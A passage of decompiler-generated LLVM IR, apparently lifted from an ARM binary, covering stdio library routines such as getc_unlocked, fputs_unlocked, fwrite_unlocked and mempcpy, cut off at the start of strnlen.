  %v0_10350 = load i32, i32* %r0.global-to-local, align 4
  %v1_10350 = trunc i32 %v0_10350 to i8
  %v3_10350 = add i32 %v0_1034c, 38
  %v4_10350 = inttoptr i32 %v3_10350 to i8*
  store i8 %v1_10350, i8* %v4_10350, align 1
  %v0_10354 = load i32, i32* %r2.global-to-local, align 4
  %v3_10354 = mul i32 %v0_10354, 4
  store i32 %v3_10354, i32* @r2, align 4
  %v0_10358 = load i32, i32* %r7.global-to-local, align 4
  %v1_10358 = add i32 %v0_10358, 40
  store i32 %v1_10358, i32* @r0, align 4
  %v2_1035c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1035c, i32* @r1, align 4
  %v0_10360 = call i32 @memcpy()
  store i32 %v0_10360, i32* %r0.global-to-local, align 4
  %v0_10364.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10364

dec_label_pc_10364:                               ; preds = %dec_label_pc_10334, %dec_label_pc_1034c
  %v2_10380 = phi i32 [ %v0_10364.pre, %dec_label_pc_1034c ], [ %v0_10334, %dec_label_pc_10334 ]
  %v1_10364 = add i32 %v2_10380, 16
  %v2_10364 = inttoptr i32 %v1_10364 to i32*
  %v3_10364 = load i32, i32* %v2_10364, align 4
  store i32 %v3_10364, i32* %r3.global-to-local, align 4
  %v1_10368 = and i32 %v3_10364, 128
  %v2_10368 = icmp eq i32 %v1_10368, 0
  br i1 %v2_10368, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_10364
  store i32 %v2_ff0c, i32* %r3.global-to-local, align 4
  %v2_10370 = inttoptr i32 %v2_10380 to i32*
  %v3_10370 = load i32, i32* %v2_10370, align 4
  %v2_10378.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_10378 = sub i32 %v2_10378.pre, %v2_ff0c
  store i32 %v3_10378, i32* %r3.global-to-local, align 4
  %v5_1037c = mul i32 %v3_10378, 4
  %v6_1037c = add i32 %v5_1037c, %v3_10370
  store i32 %v6_1037c, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_10364
  %v1_1037441 = load i32, i32* %r6.global-to-local, align 4
  %v2_1037442 = add i32 %v1_1037441, 1
  store i32 %v2_1037442, i32* %r3.global-to-local, align 4
  %v3_10380 = inttoptr i32 %v2_10380 to i32*
  store i32 %v2_1037442, i32* %v3_10380, align 4
  %v0_10384.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_1038c = phi i32 [ %v2_10380, %.thread44 ], [ %v0_10384.pre, %.thread46 ]
  %v1_10384 = add i32 %v1_1038c, 28
  %v2_10384 = inttoptr i32 %v1_10384 to i32*
  %v3_10384 = load i32, i32* %v2_10384, align 4
  store i32 %v3_10384, i32* %r3.global-to-local, align 4
  %v1_10388 = add i32 %v3_10384, 2
  store i32 %v1_10388, i32* %r0.global-to-local, align 4
  %v0_1038c = load i32, i32* %sb.global-to-local, align 4
  %v2_1038c = add i32 %v1_1038c, 24
  %v3_1038c = inttoptr i32 %v2_1038c to i32*
  store i32 %v0_1038c, i32* %v3_1038c, align 4
  br i1 %v2_10368, label %dec_label_pc_1039c, label %bb147

bb147:                                            ; preds = %bb146
  %v1_10390 = load i32, i32* @r2, align 4
  %v2_10390 = load i32, i32* %r7.global-to-local, align 4
  %v3_10390 = inttoptr i32 %v2_10390 to i32*
  store i32 %v1_10390, i32* %v3_10390, align 4
  br label %dec_label_pc_1039c

dec_label_pc_10398:                               ; preds = %dec_label_pc_ff54, %dec_label_pc_10060, %dec_label_pc_10110, %dec_label_pc_100e4, %dec_label_pc_100f0, %dec_label_pc_10030, %dec_label_pc_102d0, %dec_label_pc_1027c, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %bb147, %bb146, %dec_label_pc_10398
  %v2_103a0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_103a0, i32* @r4, align 4
  store i32 %v6_ff04, i32* @r5, align 4
  %v26_103a0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_103a0

; uselistorder directives
  uselistorder i32 %v3_10378, { 1, 0 }
  uselistorder i32 %v1_10338, { 1, 2, 0 }
  uselistorder i32 %v0_102ec, { 1, 2, 0 }
  uselistorder i32 %v2_102c8, { 1, 0 }
  uselistorder i32 %v1_102c8, { 1, 0, 2 }
  uselistorder i32 %v0_102e8, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_1022c, { 1, 2, 0 }
  uselistorder i32 %v3_10214, { 1, 0 }
  uselistorder i32 %v3_1020c, { 1, 0 }
  uselistorder i32 %v2_101ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_101d4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_101b8, { 1, 0, 2 }
  uselistorder i32 %v3_10198, { 2, 1, 0 }
  uselistorder i32 %v1_1015c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_10130, { 1, 0 }
  uselistorder i32 %v5_10090, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10090, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_1003c, { 1, 0 }
  uselistorder i32 %v0_10058, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10020, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_10008, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_fff4, { 1, 2, 0 }
  uselistorder i32 %v0_1006c, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_ffa8, { 1, 0 }
  uselistorder i32 %v1_ff78, { 0, 2, 1 }
  uselistorder i32 %v25_ff04, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %sb.global-to-local, { 7, 9, 8, 5, 3, 0, 1, 2, 4, 6 }
  uselistorder i32* %r8.global-to-local, { 4, 5, 7, 6, 8, 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 17, 3, 7, 4, 1, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18 }
  uselistorder i32* %r6.global-to-local, { 9, 11, 12, 14, 0, 2, 8, 3, 4, 5, 7, 13, 15, 6, 1, 10 }
  uselistorder i32* %r3.global-to-local, { 32, 29, 40, 33, 34, 35, 36, 37, 38, 39, 41, 42, 43, 44, 46, 45, 30, 31, 47, 48, 49, 50, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 19, 20, 21, 17, 18, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 11, 12, 13, 14, 15, 16, 0, 1, 2, 3, 5, 6, 7, 9, 4, 10, 8 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 11, 14, 16, 15, 17, 18, 19, 20, 21, 1, 23, 22, 2, 25, 3, 4, 5, 26, 6, 27, 7, 28, 8, 9, 10, 24, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 6, 5, 7, 8, 0, 1, 3, 2 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_128a8.381 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_128b8.379 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_128d4.373 to i32), { 2, 1, 3, 0, 4 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_12894.371 to i32), { 1, 0, 2 }
  uselistorder i32 -2147483648, { 1, 2, 3, 4, 0 }
  uselistorder i32 -24, { 1, 2, 0 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0, 6, 7 }
  uselistorder i32* @global_var_1b514, { 9, 0, 1, 7, 3, 8, 2, 4, 5, 6 }
  uselistorder i32 -12, { 26, 27, 28, 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24, 25 }
  uselistorder i32 -56, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1039c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10398, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_10364, { 1, 0 }
  uselistorder label %dec_label_pc_10334, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10320, { 0, 2, 1 }
  uselistorder label %dec_label_pc_102dc, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_10294, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10148, { 1, 0 }
  uselistorder label %dec_label_pc_10120, { 1, 0 }
  uselistorder label %dec_label_pc_100d0, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10050, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1004c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ffac, { 1, 0 }
  uselistorder label %dec_label_pc_ff9c, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_103c8 = load i32, i32* @r4, align 4
  store i32 %v3_103c8, i32* %stack_var_-8, align 4
  %v0_103cc = load i32, i32* @r0, align 4
  %v1_103cc = add i32 %v0_103cc, 16
  %v2_103cc = inttoptr i32 %v1_103cc to i32*
  %v3_103cc = load i32, i32* %v2_103cc, align 4
  store i32 %v3_103cc, i32* %r2.global-to-local, align 4
  %v1_103d0 = add i32 %v0_103cc, 24
  %v2_103d0 = inttoptr i32 %v1_103d0 to i32*
  %v3_103d0 = load i32, i32* %v2_103d0, align 4
  %v3_103d4 = icmp ult i32 %v3_103cc, %v3_103d0
  store i32 %v0_103cc, i32* @r4, align 4
  br i1 %v3_103d4, label %bb, label %dec_label_pc_103ec

bb:                                               ; preds = %entry
  %v2_103dc = inttoptr i32 %v3_103cc to i8*
  %v3_103dc = load i8, i8* %v2_103dc, align 1
  %v4_103dc = zext i8 %v3_103dc to i32
  store i32 %v4_103dc, i32* %r0.global-to-local, align 4
  %v6_103dc = add i32 %v3_103cc, 1
  store i32 %v6_103dc, i32* %r2.global-to-local, align 4
  store i32 %v6_103dc, i32* %v2_103cc, align 4
  br label %dec_label_pc_104ec

dec_label_pc_103ec:                               ; preds = %entry
  %v1_103ec = inttoptr i32 %v0_103cc to i8*
  %v2_103ec = load i8, i8* %v1_103ec, align 1
  %v3_103ec = zext i8 %v2_103ec to i32
  %v1_103f0 = and i32 %v3_103ec, 131
  %tmp22 = icmp ugt i32 %v1_103f0, 128
  br i1 %tmp22, label %dec_label_pc_1040c, label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103ec
  store i32 128, i32* @r1, align 4
  %v0_10400 = call i32 @__stdio_trans2r_o()
  store i32 %v0_10400, i32* %r0.global-to-local, align 4
  %v2_10404 = icmp eq i32 %v0_10400, 0
  br i1 %v2_10404, label %dec_label_pc_103fc.dec_label_pc_1040c_crit_edge, label %dec_label_pc_104e8

dec_label_pc_103fc.dec_label_pc_1040c_crit_edge:  ; preds = %dec_label_pc_103fc
  %v0_1040c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1040c

dec_label_pc_1040c:                               ; preds = %dec_label_pc_103fc.dec_label_pc_1040c_crit_edge, %dec_label_pc_103ec
  %v2_10458 = phi i32 [ %v0_1040c.pre, %dec_label_pc_103fc.dec_label_pc_1040c_crit_edge ], [ %v0_103cc, %dec_label_pc_103ec ]
  %v1_1040c = inttoptr i32 %v2_10458 to i8*
  %v2_1040c = load i8, i8* %v1_1040c, align 1
  %v3_1040c = zext i8 %v2_1040c to i32
  store i32 %v3_1040c, i32* %r2.global-to-local, align 4
  %v1_10410 = add i32 %v2_10458, 1
  %v2_10410 = inttoptr i32 %v1_10410 to i8*
  %v3_10410 = load i8, i8* %v2_10410, align 1
  %v4_10410 = zext i8 %v3_10410 to i32
  %v4_10414 = mul nuw nsw i32 %v4_10410, 256
  %v5_10414 = or i32 %v4_10414, %v3_1040c
  store i32 %v5_10414, i32* %r2.global-to-local, align 4
  %v1_10418 = and i32 %v3_1040c, 2
  %v2_10418 = icmp eq i32 %v1_10418, 0
  br i1 %v2_10418, label %dec_label_pc_10448, label %dec_label_pc_10420

dec_label_pc_10420:                               ; preds = %dec_label_pc_1040c
  %tmp23 = urem i8 %v2_1040c, 2
  %v1_10420 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_10420
  %v4_10424 = and i32 %tmp18, 4
  %v5_10424 = add i32 %v4_10424, %v2_10458
  %v1_10428 = add i32 %v5_10424, 36
  %v2_10428 = inttoptr i32 %v1_10428 to i8*
  %v3_10428 = load i8, i8* %v2_10428, align 1
  %v4_10428 = zext i8 %v3_10428 to i32
  %v1_1042c = add nsw i32 %v5_10414, -1
  store i32 %v1_1042c, i32* %r2.global-to-local, align 4
  %v3_10430 = sdiv i32 %v1_1042c, 256
  store i32 %v3_10430, i32* %r1.global-to-local, align 4
  store i32 %v4_10428, i32* %r0.global-to-local, align 4
  %v2_1043c = add i32 %v2_10458, 40
  %v3_1043c = inttoptr i32 %v2_1043c to i32*
  store i32 0, i32* %v3_1043c, align 4
  %v0_10440 = load i32, i32* %r1.global-to-local, align 4
  %v1_10440 = trunc i32 %v0_10440 to i8
  %v2_10440 = load i32, i32* @r4, align 4
  %v3_10440 = add i32 %v2_10440, 1
  %v4_10440 = inttoptr i32 %v3_10440 to i8*
  store i8 %v1_10440, i8* %v4_10440, align 1
  br label %dec_label_pc_1047c

dec_label_pc_10448:                               ; preds = %dec_label_pc_1040c
  %v1_10448 = add i32 %v2_10458, 16
  store i32 %v1_10448, i32* %r1.global-to-local, align 4
  %v1_1044c = inttoptr i32 %v1_10448 to i32*
  %v2_1044c = load i32, i32* %v1_1044c, align 4
  store i32 %v2_1044c, i32* %r1.global-to-local, align 4
  %v3_1044c = add i32 %v2_10458, 20
  %v4_1044c = inttoptr i32 %v3_1044c to i32*
  %v5_1044c = load i32, i32* %v4_1044c, align 4
  %v9_10450 = icmp eq i32 %v5_1044c, %v2_1044c
  br i1 %v9_10450, label %dec_label_pc_10460, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10448
  %v2_10454 = inttoptr i32 %v2_1044c to i8*
  %v3_10454 = load i8, i8* %v2_10454, align 1
  %v4_10454 = zext i8 %v3_10454 to i32
  store i32 %v4_10454, i32* %r0.global-to-local, align 4
  %v6_10454 = add i32 %v2_1044c, 1
  store i32 %v6_10454, i32* %r1.global-to-local, align 4
  store i32 %v6_10454, i32* %v1_1044c, align 4
  br label %dec_label_pc_104ec

dec_label_pc_10460:                               ; preds = %dec_label_pc_10448
  %v1_10460 = add i32 %v2_10458, 4
  %v2_10460 = inttoptr i32 %v1_10460 to i32*
  %v3_10460 = load i32, i32* %v2_10460, align 4
  %v4_10468 = icmp eq i32 %v3_10460, -2
  br i1 %v4_10468, label %dec_label_pc_1046c, label %dec_label_pc_10484

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10460
  %v1_1046c = or i32 %v5_10414, 4
  store i32 %v1_1046c, i32* %r2.global-to-local, align 4
  store i8 %v3_10410, i8* %v2_10410, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1047c

dec_label_pc_1047c:                               ; preds = %dec_label_pc_10420, %dec_label_pc_1046c
  %v0_1047c = load i32, i32* %r2.global-to-local, align 4
  %v1_1047c = trunc i32 %v0_1047c to i8
  %v2_1047c = load i32, i32* @r4, align 4
  %v3_1047c = inttoptr i32 %v2_1047c to i8*
  store i8 %v1_1047c, i8* %v3_1047c, align 1
  br label %dec_label_pc_104ec

dec_label_pc_10484:                               ; preds = %dec_label_pc_10460
  %v1_10484 = and i32 %v4_10414, 768
  %v2_10484 = icmp eq i32 %v1_10484, 0
  br i1 %v2_10484, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_10484
  store i32 ptrtoint (i32** @global_var_1b740.295 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_10484, %bb19
  store i32 66704, i32* @lr, align 4
  %v1_1048c = xor i1 %v2_10484, true
  call void @__pseudo_cond_branch(i1 %v1_1048c, i32 ptrtoint (i32* @global_var_e174.383 to i32))
  %v0_10490 = load i32, i32* @r4, align 4
  %v1_10490 = add i32 %v0_10490, 8
  store i32 %v1_10490, i32* %r2.global-to-local, align 4
  %v1_10494 = inttoptr i32 %v1_10490 to i32*
  %v2_10494 = load i32, i32* %v1_10494, align 4
  store i32 %v2_10494, i32* %r2.global-to-local, align 4
  %v3_10494 = add i32 %v0_10490, 12
  %v4_10494 = inttoptr i32 %v3_10494 to i32*
  %v5_10494 = load i32, i32* %v4_10494, align 4
  %v9_10498 = icmp eq i32 %v5_10494, %v2_10494
  br i1 %v9_10498, label %dec_label_pc_104cc, label %dec_label_pc_104a0

dec_label_pc_104a0:                               ; preds = %bb20
  %v2_104a0 = add i32 %v0_10490, 24
  %v3_104a0 = inttoptr i32 %v2_104a0 to i32*
  store i32 %v2_10494, i32* %v3_104a0, align 4
  %v0_104a4 = load i32, i32* @r4, align 4
  store i32 %v0_104a4, i32* %r0.global-to-local, align 4
  %v2_104a8 = call i32 @__stdio_rfill(i32 %v0_104a4)
  store i32 %v2_104a8, i32* %r0.global-to-local, align 4
  %v2_104ac = icmp eq i32 %v2_104a8, 0
  br i1 %v2_104ac, label %dec_label_pc_104e8, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %dec_label_pc_104a0
  %v0_104b4 = load i32, i32* @r4, align 4
  %v1_104b4 = add i32 %v0_104b4, 20
  %v2_104b4 = inttoptr i32 %v1_104b4 to i32*
  %v3_104b4 = load i32, i32* %v2_104b4, align 4
  %v2_104b8 = add i32 %v0_104b4, 24
  %v3_104b8 = inttoptr i32 %v2_104b8 to i32*
  store i32 %v3_104b4, i32* %v3_104b8, align 4
  %v0_104bc = load i32, i32* @r4, align 4
  %v1_104bc = add i32 %v0_104bc, 16
  %v2_104bc = inttoptr i32 %v1_104bc to i32*
  %v3_104bc = load i32, i32* %v2_104bc, align 4
  %v1_104c0 = inttoptr i32 %v3_104bc to i8*
  %v2_104c0 = load i8, i8* %v1_104c0, align 1
  %v3_104c0 = zext i8 %v2_104c0 to i32
  store i32 %v3_104c0, i32* %r0.global-to-local, align 4
  %v5_104c0 = add i32 %v3_104bc, 1
  store i32 %v5_104c0, i32* %v2_104bc, align 4
  br label %dec_label_pc_104ec

dec_label_pc_104cc:                               ; preds = %bb20
  %v1_104cc = inttoptr i32 %v0_10490 to i8*
  store i32 %v0_10490, i32* %r0.global-to-local, align 4
  %v2_104d0 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_104d0, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104d8 = call i32 @__stdio_READ(i8* %v1_104cc, i32 %v2_104d0, i32 1)
  store i32 %v5_104d8, i32* %r0.global-to-local, align 4
  %v2_104dc = icmp eq i32 %v5_104d8, 0
  br i1 %v2_104dc, label %dec_label_pc_104e8, label %bb21

bb21:                                             ; preds = %dec_label_pc_104cc
  %v4_104e0 = load i8, i8* %stack_var_-9, align 1
  %v5_104e0 = sext i8 %v4_104e0 to i32
  store i32 %v5_104e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_104ec

dec_label_pc_104e8:                               ; preds = %dec_label_pc_104cc, %dec_label_pc_103fc, %dec_label_pc_104a0
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_104ec

dec_label_pc_104ec:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_104b4, %dec_label_pc_1047c, %dec_label_pc_104e8
  %v2_104f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_104f0, i32* @r4, align 4
  %v8_104f0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_104f0

; uselistorder directives
  uselistorder i32 %v2_1044c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1040c, { 1, 0, 2 }
  uselistorder i32 %v2_10458, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_103cc, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 1, 2, 0, 5, 7, 6, 3, 8, 9, 10, 11, 15, 13, 14, 12 }
  uselistorder i8** @global_var_1b778.294, { 2, 1, 0 }
  uselistorder i32** @global_var_1b740.295, { 0, 2, 1 }
  uselistorder i32 36, { 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_104ec, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_104e8, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_1047c, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_104f8 = load i32, i32* @r4, align 4
  store i32 %v3_104f8, i32* %stack_var_-16, align 4
  %v6_104f8 = load i32, i32* @r5, align 4
  %v9_104f8 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_10504 = call i32 @strlen(i8* %arg1)
  store i32 %v3_10504, i32* @r6, align 4
  %v0_1050c = load i32, i32* @r5, align 4
  %v0_10510 = load i32, i32* @r4, align 4
  %v5_1051c = inttoptr i32 %v0_1050c to i8*
  %v6_1051c = call i32 @__GI_fwrite_unlocked(i32 %v0_10510, i32 1, i32 %v3_10504, i8* %v5_1051c)
  %v1_10520 = load i32, i32* @r6, align 4
  %v9_10520 = icmp eq i32 %v6_1051c, %v1_10520
  br i1 %v9_10520, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_10528 = phi i32 [ %v6_1051c, %entry ], [ -1, %bb ]
  %v2_10528 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10528, i32* @r4, align 4
  store i32 %v6_104f8, i32* @r5, align 4
  store i32 %v9_104f8, i32* @r6, align 4
  ret i32 %v14_10528

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_1052c = load i32, i32* @r6, align 4
  %v12_1052c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_10534 = load i8, i8* %arg4, align 1
  %v4_10534 = zext i8 %v3_10534 to i32
  %v1_10538 = and i32 %v4_10534, 192
  store i32 %v1_10538, i32* %r3.global-to-local, align 4
  %v2_1053c = icmp eq i32 %v1_10538, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_1053c, label %dec_label_pc_10564, label %dec_label_pc_10558

dec_label_pc_10558:                               ; preds = %entry
  %v4_10558 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_1055c = icmp eq i32 %v4_10558, 0
  br i1 %v2_1055c, label %dec_label_pc_10558.dec_label_pc_10564_crit_edge, label %dec_label_pc_105cc

dec_label_pc_10558.dec_label_pc_10564_crit_edge:  ; preds = %dec_label_pc_10558
  %v0_10564.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10564

dec_label_pc_10564:                               ; preds = %dec_label_pc_10558.dec_label_pc_10564_crit_edge, %entry
  %v0_1056c1 = phi i32 [ %v0_10564.pre, %dec_label_pc_10558.dec_label_pc_10564_crit_edge ], [ %arg2, %entry ]
  %v2_10564 = icmp eq i32 %v0_1056c1, 0
  br i1 %v2_10564, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10564
  br label %dec_label_pc_105cc

bb:                                               ; preds = %dec_label_pc_10564
  %v1_10568 = load i32, i32* @r6, align 4
  %v3_10568 = icmp eq i32 %v1_10568, 0
  br i1 %v3_10568, label %dec_label_pc_105cc, label %dec_label_pc_10578

dec_label_pc_10578:                               ; preds = %bb
  %v2_10578 = udiv i32 -1, %v0_1056c1
  %v0_10580 = load i32, i32* @r4, align 4
  store i32 %v0_10580, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_10568, %v2_10578
  br i1 %tmp10, label %dec_label_pc_105a4, label %dec_label_pc_1058c

dec_label_pc_1058c:                               ; preds = %dec_label_pc_10578
  %v0_10584 = load i32, i32* @r7, align 4
  %v2_1058c = mul i32 %v1_10568, %v0_1056c1
  %v4_10590 = call i32 @__stdio_fwrite(i32 %v0_10584, i32 %v2_1058c, i32 %v0_10580)
  %v0_10594 = load i32, i32* @r5, align 4
  %v2_10598 = udiv i32 %v4_10590, %v0_10594
  store i32 %v2_10598, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_105d0

dec_label_pc_105a4:                               ; preds = %dec_label_pc_10578
  %v1_105a4 = inttoptr i32 %v0_10580 to i32*
  %v2_105a4 = load i32, i32* %v1_105a4, align 4
  %v1_105a8 = or i32 %v2_105a4, 8
  store i32 %v1_105a8, i32* %r3.global-to-local, align 4
  %v3_105ac = sdiv i32 %v2_105a4, 256
  store i32 %v3_105ac, i32* %r2.global-to-local, align 4
  %v1_105b0 = trunc i32 %v3_105ac to i8
  %v3_105b0 = add i32 %v0_10580, 1
  %v4_105b0 = inttoptr i32 %v3_105b0 to i8*
  store i8 %v1_105b0, i8* %v4_105b0, align 1
  %v0_105b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_105b4 = trunc i32 %v0_105b4 to i8
  %v2_105b4 = load i32, i32* @r4, align 4
  %v3_105b4 = inttoptr i32 %v2_105b4 to i8*
  store i8 %v1_105b4, i8* %v3_105b4, align 1
  %v0_105b8 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_105c4 = inttoptr i32 %v0_105b8 to i32*
  store i32 22, i32* %v2_105c4, align 4
  %v0_105d0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_105d0

dec_label_pc_105cc:                               ; preds = %.thread, %dec_label_pc_10558, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_105d0

dec_label_pc_105d0:                               ; preds = %dec_label_pc_105a4, %dec_label_pc_1058c, %dec_label_pc_105cc
  %v0_105d0 = phi i32 [ %v0_105d0.pre, %dec_label_pc_105a4 ], [ %v2_10598, %dec_label_pc_1058c ], [ 0, %dec_label_pc_105cc ]
  store i32 %v9_1052c, i32* @r6, align 4
  store i32 %v12_1052c, i32* @r7, align 4
  ret i32 %v0_105d0

; uselistorder directives
  uselistorder i32 %v3_105ac, { 1, 0 }
  uselistorder i32 %v1_10568, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_105d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_105cc, { 2, 0, 1 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_105e4 = call i32 @memcpy()
  %v0_105e8 = load i32, i32* @r5, align 4
  %v1_105e8 = load i32, i32* @r4, align 4
  %v2_105e8 = add i32 %v1_105e8, %v0_105e8
  ret i32 %v2_105e8
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
